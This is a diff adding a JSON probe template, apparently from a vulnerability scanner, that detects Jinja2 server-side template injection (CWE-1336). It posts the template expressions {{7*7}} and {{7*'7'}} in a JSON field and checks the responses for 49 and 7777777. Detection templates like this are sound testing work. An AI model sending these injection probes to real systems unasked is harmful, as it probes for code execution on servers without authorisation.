@@ -1,0 +1,51 @@
+{
+  "name": "web/SSTI Jinja2 arith+repeat proof",
+  "description": "[critical] Proves Jinja2 SSTI code-eval on a JSON endpoint: posts {{7*7}} then {{7*'7'}}; eval to 49 + 7777777 with raw marker absent = template arithmetic AND string repetition, Jinja2-specific (Twig/Django differ). Keywords: ssti server-side template injection jinja2 python. ctrl: benign POST leaves 49 absent -> not falsified. probe_url = JSON endpoint reflecting a string field into a rendered template.",
+  "cwe": "CWE-1336",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{probe_url}}",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"name\":\"{{7*7}}\"}"
+    },
+    "jinja_repeat": {
+      "method": "POST",
+      "url": "{{probe_url}}",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"name\":\"{{7*'7'}}\"}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\\b49\\b",
+      "present": true
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\\{\\{7\\*7\\}\\}",
+      "present": false
+    },
+    {
+      "type": "body_regex",
+      "request": "jinja_repeat",
+      "pattern": "7777777",
+      "present": true
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "0ca0ef4e4ac0",
+  "created": "2026-11-05T18:01:37.085987+00:00",
+  "last_used": "2026-11-05T18:01:37.085987+00:00"
+}
